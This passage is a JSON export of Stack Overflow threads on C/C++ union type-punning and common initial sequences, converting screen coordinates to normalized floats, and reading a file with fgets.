any combination of things from the proper classes may be used together (e.g. for any combination of a machine screw from the set of all standard standard #4-40 machine screws, and a nut from the set of all standard #4-40 nuts, the threads on the nut and screw will match).  Defining categories of compliance such that any collection of inputs that was at least selectively-conforming to any compiler that was at least a minimal-conforming implementation would be required to either..."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473274357, "post_id": 31557852, "comment_id": 66082237, "body": "...process the inputs successfully without UB, in a fashion consistent with the Standard, or else refuse to do so in implementation-defined fashion (also without UB), would turn the C specifications into a real standard.  Incidentally, I wonder if there&#39;s any way to do a survey of what fraction of gcc projects don&#39;t use <code>-fno-strict-aliasing</code>?"}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473293414, "post_id": 31557852, "comment_id": 66089250, "body": "@ecatmur: On the other hand, some committee members do seem to be out to lunch.  In <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/dr_236.htm\" rel=\"nofollow noreferrer\">open-std.org/jtc1/sc22/wg14/www/docs/dr_236.htm</a> is there any basis in the Standard for regarding Example 2 as UB without also regarding <code>union { int i; float f;} u; scanf(&quot;%d&quot;, &amp;u.i); printf(&quot;%d\\n&quot;, u,i); scanf(&quot;%f\\n&quot;, &amp;u.f); printf(&quot;%f&quot;, u.f);</code> as UB, since the <code>scanf</code> uses <code>u.f</code> while the current member of the union is <code>u.i</code>?  Is the latter interpretation even remotely reasonable?"}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473332330, "post_id": 31557852, "comment_id": 66104527, "body": "@supercat wow, interesting. I think the committee position would have to be that your example is UB and you would have to write <code>scanf(&quot;%d&quot;, &amp;(u.i = {}));</code> or <code>{ int i; scanf(&quot;%d&quot;, &amp;i); u.i = i; }</code> and similarly when changing the current member to <code>u.f</code>. I agree that there&#39;s probably a lot of idiomatic code made UB by that rule."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473345132, "post_id": 31557852, "comment_id": 66113446, "body": "@ecatmur: When the C Standard was written, some compilers existed that applied various aliasing optimizations.  The authors of the Standard didn&#39;t want to tell users of those implementations that they couldn&#39;t migrate to C89 without making their existing code run slower on their existing platforms.  I see no evidence that they ever intended that the rules should be interpreted in such a fashion as to force programmers to write less efficient code.  The language hyper-modernists are pushing may be useful for some purposes, but people should not pretend it is the language which became popular..."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473345571, "post_id": 31557852, "comment_id": 66113762, "body": "...in the 1990s, nor that it is a low-level language.  A proper low-level language allows programmers to specify the machine operations they want, without having to request a bunch of operations they don&#39;t want and hope an optimizer filters out the redundancy.  I would have no argument that achieving top efficiency on newer hardware requires that compilers be able to reorder things more aggressively than was necessary in years past, but the language was never designed for that; code would be faster and more reliable if compilers focused on adding directives to tell the compiler..."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473345682, "post_id": 31557852, "comment_id": 66113853, "body": "...that things won&#39;t alias, rather than trying to apply broadly rules which were intended for much more limited purposes (legitimizing the behavior of existing compilers)."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473346873, "post_id": 31557852, "comment_id": 66114722, "body": "@ecatmur: The dominant optimization the C89 rules were trying to enable was the addition of register caching to in-order execution.  Having casts from T* to U* triggered a flush of any register-cached U* values at the point of the cast, except when incompatible arrangements of padding bits would make reinterpretation useless, would have been sufficient to allow most existing code that uses aliasing to continue working as-is, and allowed the majority of code that wouldn&#39;t work as-is to be readily adapted by adding some typecasts, without precluding many useful optimizations."}], "tags": [], "owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "is_accepted": true, "score": 11, "last_activity_date": 1437554098, "last_edit_date": 1437554098, "creation_date": 1437553753, "answer_id": 31557852, "question_id": 31553409, "link": "https://stackoverflow.com/questions/31553409/is-it-legal-and-well-defined-behavior-to-use-a-union-for-conversion-between-two/31557852#31557852", "title": "Is it legal and well defined behavior to use a union for conversion between two structs with a common initial sequence (see example)?", "body": "<p>This is fine, because the members you are accessing are elements of a <em>common initial sequence</em>.</p>\n\n<p>C11 (<strong>6.5.2.3 Structure and union members</strong>; <strong>Semantics</strong>):</p>\n\n<blockquote>\n  <p>[...] if a union contains several structures that share a common initial sequence (see below), and if the union object currently contains one of these structures, it is permitted to inspect the common initial part of any of them anywhere that a declaration of the completed type of the union is visible. Two structures share a <em>common initial sequence</em> if corresponding members have compatible types (and, for bit-fields, the same widths) for a sequence of one or more initial members.</p>\n</blockquote>\n\n<p>C++03 (<strong>[class.mem]/16</strong>):</p>\n\n<blockquote>\n  <p>If a POD-union contains two or more POD-structs that share a common initial sequence, and if the POD-union object currently contains one of these POD-structs, it is permitted to inspect the common initial part of any of them. Two POD-structs share a common initial sequence if corresponding members have layout-compatible types (and, for bit-fields, the same widths) for a sequence of one or more initial members.</p>\n</blockquote>\n\n<p>Other versions of the two standards have similar language; since C++11 the terminology used is <em>standard-layout</em> rather than <em>POD</em>. </p>\n\n<hr>\n\n<p>I think the confusion may have arisen because C permits <em>type-punning</em> (aliasing a member of a different type) via a union where C++ does not; this is the main case where to ensure C/C++ compatibility you would have to use <code>memcpy</code>. But in your case the elements you are accessing have the <em>same</em> type and are preceded by members of compatible types, so the type-punning rule is not relevant.</p>\n"}, {"comments": [{"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1452008110, "post_id": 31557914, "comment_id": 56976238, "body": "- albeit that C++ - perhaps significantly - does not make the stipulation that &quot;a declaration of the complete type of the union [must be] visible&quot;"}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "reply_to_user": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1473199334, "post_id": 31557914, "comment_id": 66046851, "body": "@underscore_d: And gcc doesn&#39;t honor such guarantee with pointers to the unions&#39; member types even when the complete union declaration is visible."}], "tags": [], "owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "is_accepted": false, "score": 5, "last_activity_date": 1489161225, "last_edit_date": 1489161225, "creation_date": 1437553915, "answer_id": 31557914, "question_id": 31553409, "link": "https://stackoverflow.com/questions/31553409/is-it-legal-and-well-defined-behavior-to-use-a-union-for-conversion-between-two/31557914#31557914", "title": "Is it legal and well defined behavior to use a union for conversion between two structs with a common initial sequence (see example)?", "body": "<p>It is legal in both C and C++</p>\n\n<p>For example, in C99 (6.5.2.3/5) and C11 (6.5.2.3/6):</p>\n\n<blockquote>\n  <p>One special guarantee is made in order to simplify the use of unions: if a union contains\n  several structures that share a common initial sequence (see below), and if the union\n  object currently contains one of these structures, it is permitted to inspect the common\n  initial part of any of them anywhere that a declaration of the complete type of the union is\n  visible. Two structures share a common initial sequence if corresponding members have\n  compatible types (and, for bit-fields, the same widths) for a sequence of one or more\n  initial members.</p>\n</blockquote>\n\n<p>Similar provisions exists in C++11 and C++14 (different wording, same meaning).</p>\n"}], "owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 742, "favorite_count": 5, "accepted_answer_id": 31557852, "answer_count": 2, "score": 17, "last_activity_date": 1489161225, "creation_date": 1437536191, "last_edit_date": 1437556841, "question_id": 31553409, "link": "https://stackoverflow.com/questions/31553409/is-it-legal-and-well-defined-behavior-to-use-a-union-for-conversion-between-two", "title": "Is it legal and well defined behavior to use a union for conversion between two structs with a common initial sequence (see example)?", "body": "<p>I have an API with a publicly facing struct A and an internal struct B and need to be able to convert a struct B into a struct A. Is the following code legal <strong>and well defined behavior</strong> in C99 (and VS 2010/C89) and C++03/C++11? If it is, please explain what makes it well-defined. If it's not, what is the most efficient and cross-platform means for converting between the two structs?</p>\n\n<pre><code>struct A {\n  uint32_t x;\n  uint32_t y;\n  uint32_t z;\n};\n\nstruct B {\n  uint32_t x;\n  uint32_t y;\n  uint32_t z;\n  uint64_t c;\n};\n\nunion U {\n  struct A a;\n  struct B b;\n};\n\nint main(int argc, char* argv[]) {\n  U u;\n  u.b.x = 1;\n  u.b.y = 2;\n  u.b.z = 3;\n  u.b.c = 64;\n\n  /* Is it legal and well defined behavior when accessing the non-write member of a union in this case? */\n  DoSomething(u.a.x, u.a.y, u.a.z);\n\n  return 0;\n}\n</code></pre>\n\n<p><br>\n<strong>UPDATE</strong></p>\n\n<p>I simplified the example and wrote two different applications. One based on memcpy and the other using a union.</p>\n\n<p><br>\n<em>Union:</em></p>\n\n<pre><code>struct A {\n  int x;\n  int y;\n  int z;\n};\n\nstruct B {\n  int x;\n  int y;\n  int z;\n  long c;\n};\n\nunion U {\n  struct A a;\n  struct B b;\n};\n\nint main(int argc, char* argv[]) {\n  U u;\n  u.b.x = 1;\n  u.b.y = 2;\n  u.b.z = 3;\n  u.b.c = 64;\n  const A* a = &amp;u.a;\n  return 0;\n}\n</code></pre>\n\n<p><br>\n<em>memcpy:</em></p>\n\n<pre><code>#include &lt;string.h&gt;\n\nstruct A {\n  int x;\n  int y;\n  int z;\n};\n\nstruct B {\n  int x;\n  int y;\n  int z;\n  long c;\n};\n\nint main(int argc, char* argv[]) {\n  B b;\n  b.x = 1;\n  b.y = 2;\n  b.z = 3;\n  b.c = 64;\n  A a;\n  memcpy(&amp;a, &amp;b, sizeof(a));\n  return 0;\n}\n</code></pre>\n\n<p><br><br>\n<em>Profiled Assembly [DEBUG] (Xcode 6.4, default C++ compiler):</em></p>\n\n<p>Here is the relevant difference in the assembly for debug mode. When I profiled the release builds there was no difference in the assembly.</p>\n\n<p><br>\nUnion:</p>\n\n<pre><code>movq     %rcx, -48(%rbp)\n</code></pre>\n\n<p><br>\nmemcpy:</p>\n\n<pre><code>movq    -40(%rbp), %rsi\nmovq    %rsi, -56(%rbp)\nmovl    -32(%rbp), %edi\nmovl    %edi, -48(%rbp)\n</code></pre>\n\n<p><br><br>\n<em>Caveat:</em></p>\n\n<p>The example code based on union produces a warning regarding variable 'a' being unused. As the profiled assembly is from debug, I don't know if there is any impact.</p>\n"}, {"tags": ["c", "math", "floating-point", "screen", "coordinates"], "comments": [{"owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "edited": false, "score": 3, "creation_date": 1437535933, "post_id": 31553325, "comment_id": 51064576, "body": "How about  outx = (X-320)/640; outy = (Y-240)/480;"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "edited": false, "score": 0, "creation_date": 1437538972, "post_id": 31553325, "comment_id": 51065315, "body": "@Cobusve Or <code>outx = (X-320)&#47;640.0f;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "edited": false, "score": 0, "creation_date": 1437537290, "post_id": 31553382, "comment_id": 51064909, "body": "When I looked there was only one ;)"}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "edited": false, "score": 0, "creation_date": 1437538080, "post_id": 31553382, "comment_id": 51065098, "body": "@Cobusve, I started with the equations that convert from fX and fY to sX and sY. Then, I added the other two equations."}, {"owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "edited": false, "score": 0, "creation_date": 1437538469, "post_id": 31553382, "comment_id": 51065185, "body": "I noticed. I removed my down-vote for you. If you started with what OP actually asked that would not have happened :). When I commented the answer contained no equation which solved the problem. You really should  finish your answers before posting ..."}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 0, "last_activity_date": 1437536622, "last_edit_date": 1437536622, "creation_date": 1437536059, "answer_id": 31553382, "question_id": 31553325, "link": "https://stackoverflow.com/questions/31553325/how-to-convert-x-and-y-screen-coordinates-to-1-0-1-0-float-in-c/31553382#31553382", "title": "How to convert X and Y screen coordinates to -1.0, 1.0 float? (in C)", "body": "<p>In the X direction:</p>\n\n<ol>\n<li>Screen coordinate <code>0</code> corresponds to <code>-1.0</code>.</li>\n<li>Screen coordinate <code>640</code> corresponds to <code>1.0</code>.</li>\n</ol>\n\n<p>You can convert that to an equation:</p>\n\n<p>Given <code>fX</code> in floating point coordinates, the screen coordinate <code>sX</code> is:</p>\n\n<pre><code>sX = 640*(fX + 1.0)/2.0\n</code></pre>\n\n<p>or</p>\n\n<pre><code>sX = 320*(fX + 1.0)\n</code></pre>\n\n<p>Similarly, given <code>fY</code> in floating point coordinates, the screen coordinate <code>sY</code> is:</p>\n\n<pre><code>sY = 480*(fY + 1.0)/2.0\n</code></pre>\n\n<p>or</p>\n\n<pre><code>sY = 240*(fY + 1.0)\n</code></pre>\n\n<p>The inverse of that:</p>\n\n<p>Given <code>sX</code> in screen coordinates, <code>fX</code> in real coordinates is:</p>\n\n<pre><code>fX = (sX/320 - 1.0)\n</code></pre>\n\n<p>Given <code>sY</code> in screen coordinates, <code>fY</code> in real coordinates is:</p>\n\n<pre><code>fY = (sY/240 - 1.0)\n</code></pre>\n\n<p>When you convert that to code, make sure the last two equations have a <code>1.0</code>. Otherwise, you'll lose accuracy due to integer division.</p>\n\n<pre><code>fX = (1.0*sX/320 - 1.0)\nfY = (1.0*sY/240 - 1.0)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 4127, "user_id": 4231385, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d89a541a4609cafea3957e4cdfcca50f?s=128&d=identicon&r=PG&f=1", "display_name": "cremno", "link": "https://stackoverflow.com/users/4231385/cremno"}, "edited": false, "score": 0, "creation_date": 1437536977, "post_id": 31553396, "comment_id": 51064822, "body": "<code>f</code> is not a valid integer constant suffix. Write <code>320.f</code> or <code>320.0f</code>."}, {"owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "reply_to_user": {"reputation": 4127, "user_id": 4231385, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d89a541a4609cafea3957e4cdfcca50f?s=128&d=identicon&r=PG&f=1", "display_name": "cremno", "link": "https://stackoverflow.com/users/4231385/cremno"}, "edited": false, "score": 0, "creation_date": 1437537135, "post_id": 31553396, "comment_id": 51064871, "body": "Really ? C99 paragraph 6.4.4.2 seems to disagree with you. I quote : &quot;An unsuffixed floating constant has type double. If suffixed by the letter f or F, it has type float. If suffixed by the letter l or L, it has type long double.&quot; and that also compiles ..."}, {"owner": {"reputation": 4127, "user_id": 4231385, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d89a541a4609cafea3957e4cdfcca50f?s=128&d=identicon&r=PG&f=1", "display_name": "cremno", "link": "https://stackoverflow.com/users/4231385/cremno"}, "edited": false, "score": 0, "creation_date": 1437537689, "post_id": 31553396, "comment_id": 51065008, "body": "Yes. Look up the differences between a floating vs. integer constant. What compiler did you use?"}, {"owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "reply_to_user": {"reputation": 4127, "user_id": 4231385, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d89a541a4609cafea3957e4cdfcca50f?s=128&d=identicon&r=PG&f=1", "display_name": "cremno", "link": "https://stackoverflow.com/users/4231385/cremno"}, "edited": false, "score": 0, "creation_date": 1437537824, "post_id": 31553396, "comment_id": 51065037, "body": "I was using our compiler XC8. Ok, also checked with gcc and that does complain. I am not sure how to interpret the standard on that one ... I see &quot;A floating constant has a significand part that may be followed by an exponent part and a suffix that specifies its type. The components of the significand part may include a digit sequence representing the whole-number part, followed by a period (.), followed by a digit sequence representing the fraction part. &quot; None of that requires the &quot;.&quot;, it has &quot;may&quot; everywhere ?"}, {"owner": {"reputation": 4127, "user_id": 4231385, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d89a541a4609cafea3957e4cdfcca50f?s=128&d=identicon&r=PG&f=1", "display_name": "cremno", "link": "https://stackoverflow.com/users/4231385/cremno"}, "edited": false, "score": 0, "creation_date": 1437538791, "post_id": 31553396, "comment_id": 51065261, "body": "The syntax is easier to understand: <code>floating-constant</code> -&gt; <code>decimal-floating-constant</code> -&gt; <code>fractional-constant</code> (<code>.</code> is not <code>opt</code>). So either it&#39;s a bug or at least a weird extension as a <code>f</code>/<code>F</code> integer constant suffix seems confusing. What&#39;s the type of <code>320L</code>? <code>long</code> or <code>long double</code>? (Btw. your answer is correct now, so +1.)"}, {"owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "reply_to_user": {"reputation": 4127, "user_id": 4231385, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d89a541a4609cafea3957e4cdfcca50f?s=128&d=identicon&r=PG&f=1", "display_name": "cremno", "link": "https://stackoverflow.com/users/4231385/cremno"}, "edited": false, "score": 0, "creation_date": 1437597483, "post_id": 31553396, "comment_id": 51101959, "body": "I looked at the spec and I agree with you. The . is not opt, so the edit I made is necessary. Thanks for pointing it out !"}], "tags": [], "owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "is_accepted": true, "score": 1, "last_activity_date": 1437537879, "last_edit_date": 1437537879, "creation_date": 1437536125, "answer_id": 31553396, "question_id": 31553325, "link": "https://stackoverflow.com/questions/31553325/how-to-convert-x-and-y-screen-coordinates-to-1-0-1-0-float-in-c/31553396#31553396", "title": "How to convert X and Y screen coordinates to -1.0, 1.0 float? (in C)", "body": "<p>Here is some C code</p>\n\n<pre><code>void convert(int X, int Y)\n{\n  float newx = 2*(X-320.0f)/640.0f;\n  float newy = 2*(Y-240.0f)/480.0f;\n\n  printf(\"New x = %f, New y = %f\", newx, newy);\n}\n</code></pre>\n\n<p>EDIT: Added the f suffix to ensure we do not do integer math !</p>\n"}], "owner": {"reputation": 13, "user_id": 5057107, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-vHQ_cypUDPc/AAAAAAAAAAI/AAAAAAAAAFA/y-b9JEPuunM/photo.jpg?sz=128", "display_name": "Jordon Moss", "link": "https://stackoverflow.com/users/5057107/jordon-moss"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 0, "accepted_answer_id": 31553396, "answer_count": 2, "score": 0, "last_activity_date": 1437537879, "creation_date": 1437535685, "question_id": 31553325, "link": "https://stackoverflow.com/questions/31553325/how-to-convert-x-and-y-screen-coordinates-to-1-0-1-0-float-in-c", "title": "How to convert X and Y screen coordinates to -1.0, 1.0 float? (in C)", "body": "<p>I'm trying to convert X and Y screen coordinates to a float range of -1.0, to 1.0.</p>\n\n<p>(-1,-1 being 0,0 and if the resolution was 640x480, 1,1 would be 640,480. 0,0 would be 320,240... the center.)</p>\n\n<p>How would I approach this? I made several futile attempts, and I'm not exactly mathematically inclined.</p>\n"}, {"tags": ["c", "printf", "fopen"], "comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1437535042, "post_id": 31553152, "comment_id": 51064375, "body": "char x[<b>3</b>][<b>6</b>];"}, {"owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "edited": false, "score": 0, "creation_date": 1437535604, "post_id": 31553152, "comment_id": 51064495, "body": "Firstly when calling fgets you should not allow more characters than you have memory. With your code you can only read 3 strings of 6 characters each so you should not pass 30, but 6 and you should not loop until EOF, but only loop 3 times.  Your second loop is printing 6 strings out of a possible list of 3 strings.  You are essentially printing random parts of memory and getting random results exactly as expected.  I think you should use the i, which you were counting to see how many strings were read out when you print. It is probably 0 and nothing was read."}, {"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1437535723, "post_id": 31553152, "comment_id": 51064528, "body": "Dimensions in <code>char x[3][6];</code> don&#39;t match how you&#39;re using <code>x</code>, and you&#39;d be writing past the bounds of <code>x</code> with <code>fgets()</code> if the file had more than 17 chars in it.  And you&#39;re reading out of bounds  with your <code>printf()</code> loop regardless.  Also, are you sure the file on your desktop is the same file your program writes?  Could there be more than one?"}], "answers": [{"comments": [{"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1437535270, "post_id": 31553228, "comment_id": 51064428, "body": "On most systems, the file would be closed when the program terminates anyway... and if not closing the file were the problem, there&#39;d be nothing in it when he reads with his second program either."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1437551975, "post_id": 31553228, "comment_id": 51070993, "body": "see <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">n1570.pdf</a> <b>5.1.2.2.3 Program termination</b> and <b>7.22.4.4 The exit function</b>"}, {"owner": {"reputation": 1, "user_id": 5141661, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b1ebf32da2a8fe5c10e0bb2150d8ffc?s=128&d=identicon&r=PG", "display_name": "MistaRhee", "link": "https://stackoverflow.com/users/5141661/mistarhee"}, "edited": false, "score": 0, "creation_date": 1437639378, "post_id": 31553228, "comment_id": 51116527, "body": "<a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa364451(v=vs.85).aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/windows/desktop/&hellip;</a>  I wasn&#39;t talking about the program doing stuff"}], "tags": [], "owner": {"reputation": 1, "user_id": 5141661, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b1ebf32da2a8fe5c10e0bb2150d8ffc?s=128&d=identicon&r=PG", "display_name": "MistaRhee", "link": "https://stackoverflow.com/users/5141661/mistarhee"}, "is_accepted": false, "score": -1, "last_activity_date": 1437535179, "last_edit_date": 1437535179, "creation_date": 1437534816, "answer_id": 31553228, "question_id": 31553152, "link": "https://stackoverflow.com/questions/31553152/writing-to-file-yet-cant-find-data-when-i-pull-the-file-up-from-desktop/31553228#31553228", "title": "Writing to file, yet can&#39;t find data when I pull the file up from desktop", "body": "<p>In your original program, you aren't closing the file. This results in weird things happening (usually stuff doesn't write unless it has to and if you don't close the file, it probably won't write because it thinks that there might be more data and you currently don't have that much stuff). </p>\n\n<p>Ref:\n<a href=\"http://cplusplus.com/reference/cstdio/fclose\" rel=\"nofollow\">http://cplusplus.com/reference/cstdio/fclose</a></p>\n"}, {"tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": false, "score": 0, "last_activity_date": 1437540464, "creation_date": 1437540464, "answer_id": 31554057, "question_id": 31553152, "link": "https://stackoverflow.com/questions/31553152/writing-to-file-yet-cant-find-data-when-i-pull-the-file-up-from-desktop/31554057#31554057", "title": "Writing to file, yet can&#39;t find data when I pull the file up from desktop", "body": "<p>While reading file you can do something like this - </p>\n\n<pre><code>   if ((fp = fopen(\"wageData.txt\",\"r\")) == NULL)\n              printf(\"File not available\");\n   else {\n             char x[100];\n             //int i = 0;\n             while (fgets(x,100, fp) != NULL)\n              {\n                     printf(\"%s\\n\", x);\n              }\n       }\n  